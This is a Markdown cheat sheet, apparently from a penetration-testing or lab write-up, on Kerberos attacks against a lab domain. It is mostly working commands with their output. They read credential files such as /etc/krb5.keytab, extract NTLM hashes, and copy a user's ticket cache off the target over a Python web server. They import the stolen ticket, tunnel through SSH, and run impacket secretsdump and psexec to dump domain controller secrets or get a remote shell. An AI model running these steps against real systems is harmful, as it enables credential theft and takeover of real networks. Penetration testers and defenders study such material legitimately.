# Kerberos Attacks

## Interesting files.
```bash
/etc/krb5.conf
/etc/krb5.keytab
```

## Extracting keytab file

We can extract the krb5 keytab file using keytabextract to retrieve NTLM hash.

```bash
python3 keytabextract.py /etc/krb5.keytab
```

## Import and exploit kerberos ticket.

1. Copy the kerberos ticket and give it root right. Then download it.

```bash
target@sinhack03:/tmp$ sudo cp krb5cc_75401103_JMEyFf krb5cc_v0lk3n
target@sinhack03:/tmp$ sudo chown root:root krb5cc_v0lk3n 

target@sinhack03:/tmp$ sudo python -m SimpleHTTPServer 1337
Serving HTTP on 0.0.0.0 port 1337 ...
192.168.x.x - - [19/May/2021 14:27:51] "GET /krb5cc_v0lk3n HTTP/1.1" 200 -

```

2. Download the krb5.conf config file.

```bash
v0lk3n@sinhack03:/etc$ python -m SimpleHTTPServer 1337
Serving HTTP on 0.0.0.0 port 1337 ...
192.168.x.x - - [19/May/2021 14:22:03] "GET /krb5.conf HTTP/1.1" 200 -
```

3. Install kerberos tools on our kali

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ sudo apt install krb5-user                                        
```

4. Now that kerberos is installed, remove the /etc/krb5.conf of our kali (if exist) and replace it with the one downloaded from the target machine.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ sudo rm /etc/krb5.conf                                               
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ sudo mv krb5.conf /etc/krb5.conf

```

5. Import the downloaded kerberos ticket, then list tickets to confirm that we successfully imported it.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ export KRB5CCNAME=/home/v0lk3n/krb5cc_v0lk3n  

┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ klist                                                                                               1 ⨯
Ticket cache: FILE:/home/v0lk3n/krb5cc_v0lk3n
Default principal: zack@SINHACK.COM

Valid starting       Expires              Service principal
19. 05. 21 20:17:53  20. 05. 21 06:17:53  krbtgt/SINHACK.COM@SINHACK.COM
        renew until 26. 05. 21 20:17:53

```

6. Once the ticket imported run a SSH tunnel on the target machine with the -D parameter.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ ssh target@192.168.x.x -D 9050                                
target@192.168.x.x's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

```

7. Now that the tunnel has been created, and that the kerberos ticket is imported, we can run secretdump using proxychains, to dump the secret of DMZDC01.

```bash
──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py sinhack.com/zack@DC01.SINHACK.COM -k -no-pass
```

Alternatively we can get a shell using psexec.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py SINHACK.COM/zack@dc01.sinhack.com -k -no-pass -debug
```
